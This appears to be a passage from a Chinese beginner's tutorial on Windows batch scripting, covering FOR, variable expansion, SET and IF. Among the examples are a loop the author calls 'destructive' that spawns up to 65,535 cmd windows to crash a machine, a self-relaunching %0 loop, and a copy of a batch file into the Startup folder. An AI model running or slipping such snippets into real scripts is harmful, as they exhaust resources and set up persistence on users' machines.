第四章 DOS循环：for命令详解

讲FOR之前呢,咋先告诉各位新手朋友,如果你有什么命令不懂,直接在CMD下面输入:
name /? 这样的格式来看系统给出的帮助文件,比如for /? 就会把FOR命令的帮助全部显示出来!当然许多菜鸟都看不懂.... 所以才会有那么多批处理文章! 俺也照顾菜鸟,把FOR命令用我自己的方式说明下!

正式开始:

 

一、基本格式

FOR %%variable IN (set) DO command [command-parameters]

  %%variable  指定一个单一字母表示可替换的参数。
  (set)      指定一个或一组文件。可以使用通配符。
  command    指定对每个文件执行的命令。
  command-parameters
             为特定命令指定参数或命令行开关。

 

 

 

参数:FOR有4个参数 /d   /l   /r   /f   他们的作用我在下面用例子解释
现在开始讲每个参数的意思

 

二、参数 /d 主要搜索匹配目录
FOR /D %%variable IN (set) DO command [command-parameters]
    如果集中包含通配符，则指定与目录名匹配，而不与文件
    名匹配。

如果 Set (也就是我上面写的 "相关文件或命令") 包含通配符（* 和 ?），将对与 Set 相匹配的每个目录（而不是指定目录中的文件组）执行指定的 Command。

这个参数主要用于目录搜索,不会搜索文件,看这样的例子

@echo off
for /d %%i in (c:\*) do echo %%i
pause

运行会把C盘根目录下的全部目录名字打印出来,而文件名字一个也不显示!

在来一个,比如我们要把当前路径下文件夹的名字只有1-3个字母的打出来
@echo off
for /d %%i in (???) do echo %%i
pause
这样的话如果你当前目录下有目录名字只有1-3个字母的,就会显示出来,没有就不显示了

这里解释下*号和?号的作用,*号表示任意N个字符,而?号只表示任意一个字符

知道作用了,给大家个思考题目!

@echo off
for /d %%i in (window?) do echo %%i
pause
保存到C盘下执行,会显示什么呢?自己看吧! 显示：windows
/D参数只能显示当前目录下的目录名字,这个大家要注意!

 


三、参数 /R 搜索指定目录树中的匹配文件

FOR /R [[drive:]path] %%variable IN (set) DO command [command-parameters]

    检查以 [drive:]path 为根的目录树，指向每个目录中的
    FOR 语句。如果在 /R 后没有指定目录，则使用当前
目录。如果集仅为一个单点(.)字符，则枚举该目录树。


递归

上面我们知道,/D只能显示当前路径下的目录名字,那么现在这个/R也是和目录有关,他能干嘛呢?放心他比/D强大多了!
他可以把当前或者你指定路径下的文件名字全部读取,注意是文件名字,有什么用看例子!

*****************************请注意2点：

    1、set中的文件名如果含有通配符(？或*)，则列举/R参数指定的目录及其下面的所用子目录中与set相符合的所有文件，无相符文件的目录则不列举。如果目录树中没有相符的文件，或者指定的目录根本不存在，这两种情况下均不会列举目录。
    2、相反，如果set中为具体文件名（即不含通配符?和*)，则枚举该目录树（即列举该目录及其下面的所有子目录），而不管set中的指定文件是否存在，也就是说，此时不但列举含有指定文件的目录，也要列举不含指定文件的其它所有目录。这与前面所说的单点（.）枚举目录树是一个道理，单点代表当前目录，也可视为一个文件。此时哪怕指定的目录根本不存在，同样会列举目录。
    比如：for /r M:\不存在 %%i in (1.exe) do echo %%i
    运行显示：M:\不存在\1.exe
*****************************
例：

@echo off
for /r c:\ %%i in (*.exe) do echo %%i
pause

咱们把这个BAT保存到D盘随便哪里然后执行,我会就会看到,他把C盘根目录,和每个目录的子目录下面全部的EXE文件都列出来了!!!!没有exe文件的目录则不列举。

例：
@echo off
for /r %%i in (*.exe) do echo %%i
pause
参数不一样了吧!这个命令前面没加那个C:\也就是搜索路径,这样他就会以当前目录为搜索路径,比如你这个BAT你把他放在d:\test目录下执行,那么他就会把D:\test目录和他下面的子目录的全部EXE文件列出来!!!

例：
@echo off
for /r c:\ %%i in (boot.ini) do echo %%i
pause
运行本例发现枚举了c盘所有目录。


为了只列举boot.ini存在的目录，可改成下面这样：
@echo off
for /r c:\ %%i in (boot.ini) do if exist %%i echo %%i
pause
用这条命令搜索文件真不错。。。。。。

这个参数大家应该理解了吧!还是满好玩的命令!

 


四、参数 /L 按数字序列(start,step,end)循环

FOR /L %%variable IN (start,step,end) DO command [command-parameters]

    该集表示以增量形式从开始到结束的一个数字序列。
    因此，(1,1,5) 将产生序列 1 2 3 4 5，(5,-1,1) 将产生
    序列 (5 4 3 2 1)。

使用迭代变量设置起始值 (Start#)，然后逐步执行一组范围的值，直到该值超过所设置的终止值 (End#)。/L 将通过对 Start# 与 End# 进行比较来执行迭代变量。如果 Start# 小于 End#，就会执行该命令。如果迭代变量超过 End#，则命令解释程序退出此循环。还可以使用负的 Step# 以递减数值的方式逐步执行此范围内的值。例如，(1,1,5) 生成序列 1 2 3 4 5，而 (5,-1,1) 则生成序列 (5 4 3 2 1)。语法是：

看着这说明有点晕吧!咱们看例子就不晕了!

@echo off
for /l %%i in (1,1,5) do @echo %%i
pause
保存执行看效果,他会打印从1 2 3 4 5  这样5个数字
(1,1,5)这个参数也就是表示从1开始每次加1直到5终止!

等会晕,就打印个数字有P用...好的满足大家,看这个例子
@echo off
for /l %%i in (1,1,5) do start cmd
pause
执行后是不是吓了一跳,怎么多了5个CMD窗口,呵呵!如果把那个 (1,1,5)改成 (1,1,65535)会有什么结果,我先告诉大家,会打开65535个CMD窗口....这么多你不死机算你强!
当然我们也可以把那个start cmd改成md %%i 这样就会建立指定个目录了!!!名字为1-65535

看完这个被我赋予破坏性质的参数后,我们来看最后一个参数

  


五、参数 /F 处理命令输出、字符串及文件内容

\迭代及文件解析
使用文件解析来处理命令输出、字符串及文件内容。使用迭代变量定义要检查的内容或字符串，并使用各种options选项进一步修改解析方式。使用options令牌选项指定哪些令牌应该作为迭代变量传递。请注意：在没有使用令牌选项时，/F 将只检查第一个令牌。
文件解析过程包括读取输出、字符串或文件内容，将其分成独立的文本行以及再将每行解析成零个或更多个令牌。然后通过设置为令牌的迭代变量值，调用 for 循环。默认情况下，/F 传递每个文件每一行的第一个空白分隔符号。跳过空行。


详细的帮助格式为：
FOR /F ["options"] %%variable IN (file-set) DO command [command-parameters]
FOR /F ["options"] %%variable IN ("string") DO command [command-parameters]
FOR /F ["options"] %%variable IN ('command') DO command [command-parameters]

    带引号的字符串"options"包括一个或多个
    指定不同解析选项的关键字。这些关键字为:

        eol=c           - 指一个行注释字符的结尾(就一个)
        skip=n          - 指在文件开始时忽略的行数。
        delims=xxx      - 指分隔符集。这个替换了空格和跳格键的
                          默认分隔符集。
        tokens=x,y,m-n  - 指每行的哪一个符号被传递到每个迭代
                          的 for 本身。这会导致额外变量名称的分配。m-n
                          格式为一个范围。通过 nth 符号指定 mth。如果
                          符号字符串中的最后一个字符星号，
                          那么额外的变量将在最后一个符号解析之后
                          分配并接受行的保留文本。经测试，该参数最多
                          只能区分31个字段。

        usebackq        - 使用后引号（键盘上数字1左面的那个键`）。

                        未使用参数usebackq时：file-set表示文件，但不能含有空格
                            双引号表示字符串，即"string"
                            单引号表示执行命令，即'command'

                          使用参数usebackq时：file-set和"file-set"都表示文件
                          当文件路径或名称中有空格时，就可以用双引号括起来
                            单引号表示字符串，即'string'
                            后引号表示命令执行，即`command`

 

以上是用for /?命令获得的帮助信息，直接复制过来的。
晕惨了!我这就举个例子帮助大家来理解这些参数!


For命令例1：****************************************
@echo off
rem 首先建立临时文件test.txt
echo ;注释行,这是临时文件,用完删除 >test.txt
echo 11段 12段 13段 14段 15段 16段 >>test.txt
echo 21段,22段,23段,24段,25段,26段 >>test.txt
echo 31段-32段-33段-34段-35段-36段 >>test.txt
FOR /F "eol=; tokens=1,3* delims=,- " %%i in (test.txt) do echo %%i %%j %%k
Pause
Del test.txt

运行显示结果：

11段 13段 14段 15段 16段
21段 23段 24段,25段,26段
31段 33段 34段-35段-36段
请按任意键继续. . .

为什么会这样?我来解释：
eol=;          分号开头的行为注释行
tokens=1,3*    将每行第1段,第3段和剩余字段分别赋予变量%%i，%%j，%%k
delims=,-     （减号后有一空格）以逗号减号和空格为分隔符，空格必须放在最后


For命令例2：****************************************
@echo off
FOR /F "eol= delims=" %%i in (test.txt) do echo %%i
Pause

运行将显示test.txt全部内容，包括注释行，不解释了哈。


For命令例3：****************************************

另外/F参数还可以以输出命令的结果看这个例子

@echo off
FOR /F "delims=" %%i in ('net user') do @echo %%i
pause

这样你本机全部帐号名字就出来了把扩号内的内容用两个单引号引起来就表示那个当命令执行,FOR会返回命令的每行结果,加那个"delims=" 是为了让我空格的行能整行显示出来,不加就只显示空格左边一列!


基本上讲完了FOR的基本用法了...如果你看过FOR的系统帮助,你会发现他下面还有一些特定义的变量,这些我先不讲.大家因该都累了吧!你不累我累啊....

所谓文武之道，一张一弛，现休息一下。

 

 

 

 

 



第五章 FOR命令中的变量
FOR命令中有一些变量,他们的用法许多新手朋友还不太了解,今天给大家讲解他们的用法!


先把FOR的变量全部列出来:
     ~I          - 删除任何引号(")，扩展 %I
     %~fI        - 将 %I 扩展到一个完全合格的路径名
     %~dI        - 仅将 %I 扩展到一个驱动器号
     %~pI        - 仅将 %I 扩展到一个路径
     %~nI        - 仅将 %I 扩展到一个文件名
     %~xI        - 仅将 %I 扩展到一个文件扩展名
     %~sI        - 扩展的路径只含有短名
     %~aI        - 将 %I 扩展到文件的文件属性
     %~tI        - 将 %I 扩展到文件的日期/时间
     %~zI        - 将 %I 扩展到文件的大小
     %~$PATH:I   - 查找列在路径环境变量的目录，并将 %I 扩展
                   到找到的第一个完全合格的名称。如果环境变量名
                   未被定义，或者没有找到文件，此组合键会扩展到
                   空字符串


我们可以看到每行都有一个大写字母"I",这个I其实就是我们在FOR带入的变量,我们FOR语句代入的变量名是什么,这里就写什么.
比如:FOR /F  %%z IN ('set') DO @echo %%z
这里我们代入的变量名是z那么我们就要把那个I改成z,例如%~fI改为%~fz
至于前面的%~p这样的内容就是语法了!


好开始讲解:

 

一、 ~I          - 删除任何引号(")，扩展 %I

这个变量的作用就如他的说明,删除引号!
我们来看这个例子:
首先建立临时文件temp.txt，内容如下
"1111
"2222"
3333"
"4444"44
"55"55"55

可建立个BAT文件代码如下:

@echo off
echo ^"1111>temp.txt
echo "2222">>temp.txt
echo 3333^">>temp.txt
echo "4444"44>>temp.txt
echo ^"55"55"55>>temp.txt
rem 上面建立临时文件，注意不成对的引号要加转义字符^，重定向符号前不要留空格
FOR /F "delims=" %%i IN (temp.txt) DO echo  %%~i
pause
del temp.txt
执行后,我们看CMD的回显如下:
1111           #字符串前的引号被删除了
2222           #字符串首尾的引号都被删除了
3333"          #字符串前无引号，后面的引号保留
4444"44        #字符串前面的引号删除了，而中间的引号保留
55"55"55       #字符串前面的引号删除了，而中间的引号保留
请按任意键继续. . .

和之前temp.txt中的内容对比一下,我们会发现第1、2、5行的引号都消失了,这就是删除引号~i的作用了!
删除引号规则如下(BAT兄补充!)
1、若字符串首尾同时存在引号，则删除首尾的引号；
2、若字符串尾不存在引号，则删除字符串首的引号；
3、如果字符串中间存在引号，或者只在尾部存在引号，则不删除。

龙卷风补充：无头不删，有头连尾删。

 


二、 %~fI        - 将 %I 扩展到一个完全合格的路径名

看例子:
把代码保存放在随便哪个地方,我这里就放桌面吧.
FOR /F "delims==" %%i IN ('dir /b') DO @echo  %%~fi
pause

执行后显示内容如下
C:\Documents and Settings\Administrator\桌面\test.bat
C:\Documents and Settings\Administrator\桌面\test.vbs
当我把代码中的 %%~fi直接改成%%i
FOR /F "delims==" %%i IN ('dir /b') DO @echo  %%i
pause

执行后就会显示以下内容：
test.bat
test.vbs

通过对比,我们很容易就看出没有路径了,这就是"将 %I 扩展到一个完全合格的路径名"的作用
也就是如果%i变量的内容是一个文件名的话,他就会把这个文件所在的绝对路径打印出来,而不只单单打印一个文件名,自己动手动实验下就知道了!

 


三、 %~dI        - 仅将 %I 扩展到一个驱动器号

看例子:
代码如下,我还是放到桌面执行!
FOR /F "delims==" %%i IN ('dir /b') DO @echo  %%~di
pause
执行后我CMD里显示如下
C:
C:
我桌面就两个文件test.bat,test.vbs,%%~di作用是,如果变量%%i的内容是一个文件或者目录名,他就会把他这文件
或者目录所在的盘符号打印出来!

 


四、 %~pI        - 仅将 %I 扩展到一个路径

这个用法和上面一样,他只打印路径不打印文件名字
FOR /F "delims==" %%i IN ('dir /b') DO @echo  %%~pi
pause

我就不打结果了,大家自己复制代码看结果吧,下面几个都是这么个用法,代码给出来,大家自己看结果吧!

 


五、 %~nI        - 仅将 %I 扩展到一个文件名
只打印文件名字
FOR /F "delims==" %%i IN ('dir /b') DO @echo  %%~ni
pause

 


六、 %~xI        - 仅将 %I 扩展到一个文件扩展名
只打印文件的扩展名
FOR /F "delims==" %%i IN ('dir /b') DO @echo  %%~xi
pause

 


七、 %~sI        - 扩展的路径只含有短名
打印绝对短文件名
FOR /F "delims==" %%i IN ('dir /b') DO @echo  %%~si
pause

 


八、 %~aI        - 将 %I 扩展到文件的文件属性
打印文件的属性
FOR /F "delims==" %%i IN ('dir /b') DO @echo  %%~ai
pause

 


九、 %~tI        - 将 %I 扩展到文件的日期/时间
打印文件建立的日期
FOR /F "delims==" %%i IN ('dir /b') DO @echo  %%~ti
pause


十、 %~zI        - 将 %I 扩展到文件的大小
打印文件的大小
FOR /F "delims==" %%i IN ('dir /b') DO @echo  %%~zi
pause
上面例子中的"delims=="可以改为"delims="，即不要分隔符

 


十一、 %~$PATH:I - 查找列在路径环境变量的目录，并将 %I 扩展
                   到找到的第一个完全合格的名称。如果环境变量名
                   未被定义，或者没有找到文件，此组合键会扩展到
                   空字符串
这是最后一个,和上面那些都不一样,我单独说说!


然后在把这些代码保存为批处理,放在桌面。
@echo off
FOR /F "delims=" %%i IN (“notepad.exe”) DO echo  %%~$PATH:i
pause

龙卷风补充：上面代码显示结果为C:\WINDOWS\system32\notepad.exe

他的意思就在PATH变量里指定的路径里搜索notepad.exe文件，如果有notepad.exe则会把他所在绝对路径打印出来，没有就打印一个错误！


好了,FOR的的变量就介绍到这了!
                               

 

 

 

 



第六章 批处理中的变量
批处理中的变量,我把他分为两类,分别为"系统变量"和"自定义变量"

我们现在来详解这两个变量!


一、系统变量

他们的值由系统将其根据事先定义的条件自动赋值,也就是这些变量系统已经给他们定义了值,
不需要我们来给他赋值,我们只需要调用而以!  我把他们全部列出来!


%ALLUSERSPROFILE% 本地 返回“所有用户”配置文件的位置。
%APPDATA% 本地 返回默认情况下应用程序存储数据的位置。
%CD% 本地 返回当前目录字符串。
%CMDCMDLINE% 本地 返回用来启动当前的 Cmd.exe 的准确命令行。
%CMDEXTVERSION% 系统 返回当前的“命令处理程序扩展”的版本号。
%COMPUTERNAME%  系统 返回计算机的名称。
%COMSPEC%  系统 返回命令行解释器可执行程序的准确路径。
%DATE%  系统 返回当前日期。使用与 date /t 命令相同的格式。由 Cmd.exe 生成。有关

date 命令的详细信息，请参阅 Date。
%ERRORLEVEL%  系统 返回上一条命令的错误代码。通常用非零值表示错误。
%HOMEDRIVE%  系统 返回连接到用户主目录的本地工作站驱动器号。基于主目录值而设置。用

户主目录是在“本地用户和组”中指定的。
%HOMEPATH%  系统 返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。

%HOMESHARE%  系统 返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是

在“本地用户和组”中指定的。
%LOGONSERVER%  本地 返回验证当前登录会话的域控制器的名称。
%NUMBER_OF_PROCESSORS%  系统 指定安装在计算机上的处理器的数目。
%OS%  系统 返回操作系统名称。Windows 2000 显示其操作系统为 Windows_NT。
%PATH% 系统 指定可执行文件的搜索路径。
%PATHEXT% 系统 返回操作系统认为可执行的文件扩展名的列表。
%PROCESSOR_ARCHITECTURE%  系统 返回处理器的芯片体系结构。值：x86 或 IA64 基于

Itanium
%PROCESSOR_IDENTFIER% 系统 返回处理器说明。
%PROCESSOR_LEVEL%  系统 返回计算机上安装的处理器的型号。
%PROCESSOR_REVISION% 系统 返回处理器的版本号。
%PROMPT% 本地 返回当前解释程序的命令提示符设置。由 Cmd.exe 生成。
%RANDOM% 系统 返回 0 到 32767 之间的任意十进制数字。由 Cmd.exe 生成。
%SYSTEMDRIVE% 系统 返回包含 Windows server operating system 根目录（即系统根目录）

的驱动器。
%SYSTEMROOT%  系统 返回 Windows server operating system 根目录的位置。
%TEMP% 和 %TMP% 系统和用户 返回对当前登录用户可用的应用程序所使用的默认临时目录。

有些应用程序需要 TEMP，而其他应用程序则需要 TMP。
%TIME% 系统 返回当前时间。使用与 time /t 命令相同的格式。由 Cmd.exe 生成。有关

time 命令的详细信息，请参阅 Time。
%USERDOMAIN% 本地 返回包含用户帐户的域的名称。
%USERNAME% 本地 返回当前登录的用户的名称。
%USERPROFILE% 本地 返回当前用户的配置文件的位置。
%WINDIR% 系统 返回操作系统目录的位置。


这么多系统变量,我们如何知道他的值是什么呢?
在CMD里输入  echo %WINDIR%
这样就能显示一个变量的值了!

举个实际例子,比如我们要复制文件到当前帐号的启动目录里就可以这样

copy d:\1.bat "%USERPROFILE%\「开始」菜单\程序\启动\"

%USERNAME% 本地 返回当前登录的用户的名称。  注意有空格的目录要用引号引起来


另外还有一些系统变量,他们是代表一个意思,或者一个操作!

他们分别是%0 %1 %2 %3 %4 %5 ......一直到%9 还有一个%*

%0 这个有点特殊,有几层意思,先讲%1-%9的意思.

%1 返回批处理的第一个参数
%2 返回批处理的第二个参数
%3-%9依此推类

反回批处理参数?到底怎么个返回法?

我们看这个例子,把下面的代码保存为test.BAT然后放到C盘下

@echo off
echo %1 %2 %3 %4
echo %1
echo %2
echo %3
echo %4

进入CMD,输入cd c:\
然后输入 test.bat 我是第一个参数 我是第二个参数  我是第三个参数  我是第四个参数

注意中间的空格,我们会看到这样的结果:

我是第一个参数 我是第二个参数 我是第三个参数 我是第四个参数
我是第一个参数
我是第二个参数
我是第三个参数
我是第四个参数

对比下代码,%1就是”我是第一个参数”  %2就是”我是第二个参数”
怎么样理解了吧!


这些%1和%9可以让批处理也能带参数运行,大大提高批处理功能!

 

还有一个%*  他是什么呢?他的作用不是很大,只是返回参数而已,不过他是一次返回全部参数的值,不用在输入%1 %2来确定一个个的


例子
@echo off
echo %*

同样保存为test.bat 放到C盘
进入CMD,输入cd c:\
然后输入 test.bat 我是第一个参数 我是第二个参数  我是第三个参数  我是第四个参数

可以看到他一次把全部参数都显示出来了


好现在开始讲那个比较特殊的%0


%0  这个不是返回参数的值了,他有两层意思!

第一层意思:返回批处理所在绝对路径

例子:
@echo off
echo %0
pause

保存为test.BAT放在桌面运行,会显示如下结果
"C:\Documents and Settings\Administrator\桌面\test.bat"

他把当前批处理执行的所在路经打印出来了,这就是返回批处理所在绝对路径的意思

第二层意思:无限循环执行BAT

例子:
@echo off
net user
%0

保存为BAT执行,他就会无限循环执行net user这条命令,直到你手动停止.
龙卷风补充：其实%0就是第一参数%1前面那个参数，当然就是批处理文件名（包括路径）。

以上就是批处理中的一些系统变量,另外还有一些变量,他们也表示一些功能,
FOR命令中的那些就是,FOR变量已经说过,就不讲了.

 

 

二、自定义变量

故名思意,自定义变量就是由我们来给他赋予值的变量

要使用自定义变量就得使用set命令了,看例子.

@echo off
set var=我是值
echo %var%
pause

保存为BAT执行,我们会看到CMD里返回一个  "我是值"

var为变量名,=号右变的是要给变量的值
这就是最简单的一种设置变量的方法了

如果我们想让用户手工输入变量的值,而不是在代码里指定,可以用用set命令的/p参数

例子:

@echo off
set /p var=请输入变量的值
echo %var%
pause

var变量名  =号右边的是提示语,不是变量的值
变量的值由我们运行后自己用键盘输入!








第七章 set命令详解
很久没发贴了,今天来写点讲BAT的新手教学贴!
在上一贴中我简单的介绍了一下SET设置自定义变量的作用,现在我来具体讲一下set的其他功能.
一、用set命令设置自定义变量
显示、设置或删除 cmd.exe 环境变量。
SET [variable=[string]]
  variable  指定环境变量名。
  string    指定要指派给变量的一系列字符串。
要显示当前环境变量，键入不带参数的 SET。
SET 命令不允许变量名含有等号。

例子:
@echo off
set var=我是值
echo %var%
pause
请看 set var=我是值 ,这就是BAT直接在批处理中设置变量的方法!
set 是命令   var是变量名  =号右边的"我是值"是变量的值
在批处理中我们要引用这个变就把var变量名用两个%(百分号)扩起来,如%var%

SET还可以提供一个交互界面,让用户自己输入变量的值,然后我们在来根据这个值来做相应操作,现在我就来说说SET的这种语法,只需要加一个"/P"参数就可以了!
SET /P variable=[promptString]

例子:
@echo off
set /p var=请输入变量的值:
echo 您输入了 %var%  ~_~
pause
set /p 是命令语法  var是变量名    =号右边的"请输入变量的值: ",这个是提示语,不是变量的值了!
运行后,我们在提示语后面直接输入1,就会显示一行您输入了 1 ~_~
好了,先回顾到这,现在讲SET其他功能
使用set /?查看SET的帮助我们发现SET除了我上面讲的
SET [variable=[string]]
SET /P variable=[promptString]
这两种语法外,还有如下几种语法:
SET /A expression
环境变量替换已如下增强:
%PATH:str1=str2%
%PATH:~10,5%
%PATH:~-10%
%PATH:~0,-2%
这机种语法有什么用处呢?下面我们来一个个讲解他们!
二、用set命令进行简单计算
语法：SET /A expression
/A 命令行开关指定等号右边的字符串为被评估的数字表达式。该表达式
评估器很简单并以递减的优先权顺序支持下列操作:
    ()                  -分组
    ! ~ -               -一元运算符
    * / %               -算数运算符
    + -                 -算数运算符
    << >>               -二进制逻辑移位
    &                   -二进制按位“与”
    ^                   -二进制按位“异”
    |                   -二进制按位“或”
    = *= /= %= += -=    -算数赋值
    &= ^= |= <<= >>=    -二进制运算赋值
    ,                   -表达式分隔符

上面这些是系统帮助里的内容,看着是不是有点晕，没关系我来简单解释一下:
set的/A参数就是让SET可以支持数学符号进行加减等一些数学运算!
现在开始举例子介绍这些数学符号的用法:
例：
@echo off
set /p input=请输入计算表达式：
set /a var=%input%
echo 计算结果：%input%=%var%
pause
上面的例子是龙卷风设计的，很好用哟，请看下面几个运算过程：
注意：DOS计算只能精确到整数
请输入计算表达式：1+9+20+30-10
计算结果：1+9+20+30-10=50
请按任意键继续. . .
请输入计算表达式：10/3
计算结果：10/3=3  #DOS计算精确到整数，小数舍了。
请按任意键继续. . .
请输入计算表达式：-100+62
计算结果：-100+62=-38
请按任意键继续. . .
请输入计算表达式：100%3    ＃求余数
计算结果：100%3=1
请按任意键继续. . .
请输入计算表达式：(25+75)*2/(15+5)
计算结果：(25+75)*2/(15+5)=10
请按任意键继续. . .
请输入计算表达式：1234567890*9876543210
无效数字。数字精确度限为 32 位。
计算结果：1234567890*9876543210=
请按任意键继续. . .
注意：上面的计算过程显示，DOS计算只能精确到32位，这个32位是指二进制32位，其中最高位为符号位（0为正，1为负），低位31位为数值。31个1换成十进制为2147483647，所以DOS计算的有效值范围是-2147483647至2147483647，超出该数值范围时计算出错，请看下面的计算过程：
请输入计算表达式：2147483647-1    ＃最大值减1，值有效
计算结果：2147483647-1=2147483646
请按任意键继续. . .

运行set /a a=1+1,b=2+1,c=3+1后会显示一个4,但我们用
echo %a% %b% %c%后看结果,会发现其他数学运算也有效果!,这就是"逗"号的
作用!

有时候我们需要直接在原变量进行加减操作就可以用这种语法
set /a var+=1  这样的语法对应原始语法就是set /a var = %var% + 1
都是一样的结果,在原变量的值上在进行数学运算,不过这样写简单一点
再来一个:
set /a var*=2
其他都这么用,只要帮助里有这个语法!

另外还有一些用逻辑或取余操作符,这些符号,按照上面的使用方法会报错的
比如我们在CMD里输入set /a var=1 & 1 "与运算",他并不会显示为1,而是报错,
为什么?对于这样的"逻辑或取余操作符",我们需要把他们用双引号引起来,也可以用转义字符^，看例子
set /a var= 1 "&" 1 这样结果就显示出来了,其他逻辑或取余操作符用法
set /a var= 1 "+" 1 异运算
set /a var= 1 "%" 1  取模运算
set /a var= 3 "<<" 2 左移位运算， 3的二进制为11，左移2位为1100，换成十进制就是12，自行验证
set /a var= 4 ">>" 2右移位运算，4的二进制为100，右移动2位为1，结果为1
还有几个数学不太行,搞不清楚了....不列出来了,
龙卷风补充：凡是按位计算均需换算成二进制，下面行中的符号均针对二进制
这些符号也可以用&= ^= |= <<= >>= 这样的简单用法如
set /a var"&=" 1 等于set /a var = %var% "&" 1 注意引号
思考题：求2的n次方
答案：
@echo off
set /p n=请输入2的几次方: 
set /a num=1^<^<n
echo %num%
pause

三、用set命令进行字符串处理
1、字符串替换
好了，符号说到这，现在说%PATH:str1=str2%
上面语法的意思就是：将字符串变量%PATH%中的str1替换为str2
这个是替换变量值的内容,看例子
@echo off
set a= bbs. verybat. cn
echo 替换前的值: "%a%"
set var=%a: =%
echo 替换后的值: "%var%"
pause
运行显示：（龙卷风添加）
替换前的值: " bbs. verybat. cn"
替换后的值: "bbs.verybat.cn"
对比一下,我们发现他把变量%a%的空格给替换掉了,从这个例子,我们就可以发现
%PATH:str1=str2%这个操作就是把变量%PATH%的里的str1全部用str2替换
比如我们把上面的例子改成这样
@echo off
set a=bbs.verybat.cn
echo 替换前的值: "%a%"
set var=%a:.=伤脑筋%
echo 替换后的值: "%var%"
pause
运行显示： 
替换前的值: "bbs.verybat.cn"
替换后的值: "bbs伤脑筋verybat伤脑筋cn"
解释set var=%a:.=伤脑筋%
    set是命令 var是变量名 字a是要进行字符替换的变量的值,"."为要替换的值,
"伤脑筋"为替换后的值!
执行后就会把变量%a%里面的"."全部替换为"伤脑筋"
这就是set的替换字符的很好的功能! 替换功能先讲到这，下面将字符串截取功能
2、字符串截取
**********************************************
截取功能统一语法格式为：%a:~[m[,n]]%
**********************************************
方括号表示可选，%为变量标识符，a为变量名，不可少，冒号用于分隔变量名和说明部分，符号～可以简单理解为“偏移”即可，m为偏移量（缺省为0），n为截取长度（缺省为全部）

%PATH:~10,5%  这个什么意思,看例子:
截取功能例子1：
@echo off
set a=bbs.verybat.cn
set var=%a:~1,2%
echo %var%
pause
执行后,我们会发现只显示了"bs"两个字母,我们的变量%a%的值不是为bbs.verybat.cn吗？
怎么只显示了第2个字母和第3个字母"bs",分析一结果我们就可以很容易看出
%PATH:~10,5%就是显示变量PATH里从11位（偏移量10）开始的5个字符!
分析set var=%a:~1,2%
  set是命令，var是变量值，a要进行字符操作的变量，"1"从变量"a"第几位开始显示，"2"表示显示几位。
合起来就是把变量a的值从第2位（偏移量1）开始,把2个字符赋予给变量var
这样应该明白了吧~
其他两种语法
%PATH:~-10%
%PATH:~0,-2%
他们也是显示指定变量指定几位的值的意思
%PATH:~-10% 看例子
截取功能例子2：
@echo off
set a=bbs.verybat.cn
set var=%a:~-3%
echo %var%
pause
运行结果：.cn
这个就是把变量a倒数3位的值给变量VAR
当然我们也可以改成这样
截取功能例子3：
@echo off
set a=bbs.verybat.cn
set var=%a:~3%
echo %var%
pause
运行显示：.verybat.cn
这个就是把变量a的从第3位开始后面全部的值给变量VAR
%PATH:~0,-2%  例子
截取功能例子4：
@echo off
set a=bbs.verybat.cn
set var=%a:~0,-3%
echo %var%
pause
执行后,我们发现显示的是"bbs.verybat",少了".cn"
从结果分析,很容易分析出,这是把变量a的值从0位开始,
到倒数第三位之间的值全部赋予给var
如果改成这样
截取功能例子5：
@echo off
set a=bbs.verybat.cn
set var=%a:~2,-3%
echo %var%
pause
运行显示：s.verybat
那么他就是显示从第3位（偏移量2）开始减去倒数三位字符的值,并赋予给变量var
讲得好，例子就是说明问题，为便于记忆，龙卷风小节如下：
a=bbs.verybat.cn
%a:~1,2%   ＝“bs”   偏移量1，从第二位开始向右取2位
%a:~-3%    ＝“.cn”  偏移量负3，即倒数3位（也可理解为留下右边3位），右取全部
%a:~3%     ＝“.verybat.cn” 偏移量3（也可理解为去掉左边3位），右取全部
%a:~0,-3%   ＝“bbs.verybat” 偏移量0，右取长度至负3，即倒数3位
%a:~2,-3%   ＝“s.verybat”  偏移量2，右取长度至负3，即倒数3位
**********************************************
所以，截取功能统一语法格式为：%a:~[m[,n]]%
**********************************************
方括号表示可选，%a%为变量名，不可少，冒号用于分隔变量名和说明部分，符号～可以简单理解为“偏移”即可，m为偏移量（缺省为0），n为截取长度（缺省为全部）
上面所述用法其实相当于vbs函数mid、left、right
%a:~0,n%  相当于函数left(a,n)  取左边n位
%a:~-m%  相当于函数right（a,m） 取右边m位
%a:~m,n% 相当于函数mid(a,m+1,n) 从m+1位开始取n位
%a:~m,-n% 相当于函数mid(a,m+1,len(a)-m-n)
%a:~m %  相当于函数mid(a,m+1,len(a)-m) 或者right(a,len(a)-m)
思考题目：输入任意字符串，求字符串的长度
参考答案：
@echo off
set /p str=请输入任意长度的字符串:
echo 你输入了字符串:"%str%"
if not defined str (pause & goto :eof)
set num=0
:len
set /a num+=1
set str=%str:~0,-1%
if defined str goto len
echo 字符串长度为：%num%
pause
好了set的一些用法,就介绍到这了,希望对各位有所帮助,时间不早睡觉Zz....


第八章 if命令讲解
最近发现有些朋友一老问IF命令的用法,IF命令个人觉得很简单,所以就一直没把发放到新手教学贴里说,现在我给补上一文,希望对各位"非常BAT的"新手朋友们有所帮助.

现在开始:
在CMD使用IF /?打开IF的系统帮助(自己看我就不全部列出来了),我们会发现IF有3种基本的用法!
执行批处理程序中的条件处理。
IF [NOT] ERRORLEVEL number command
IF [NOT] string1==string2 command
IF [NOT] EXIST filename command
  NOT               指定只有条件为 false 的情况下， Windows XP 才
                    应该执行该命令。
  ERRORLEVEL number 如果最后运行的程序返回一个等于或大于
                    指定数字的退出编码，指定条件为 true。
  string1==string2  如果指定的文字字符串匹配，指定条件为 true。
  EXIST filename    如果指定的文件名存在，指定条件为 true。
  command           如果符合条件，指定要执行的命令。如果指定的
                     条件为 FALSE，命令后可跟一个执行 ELSE
                      关键字后的命令的 ELSE 命令。
ELSE 子句必须在 IF 之后出现在同一行上。例如:
    IF EXIST filename (
        del filename
    ) ELSE (
        echo filename missing
    )
第一种用法：IF [NOT] ERRORLEVEL number command
这个用法的基本做用是判断上一条命令执行结果的代码,以决定下一个步骤.
一般上一条命令的执行结果代码只有两结果,"成功"用0表示  "失败"用1表示.
举个例子:
@echo off
net user
IF %ERRORLEVEL% == 0 echo net user 执行成功了!
pause
这是个简单判断上条命令是否执行成功.
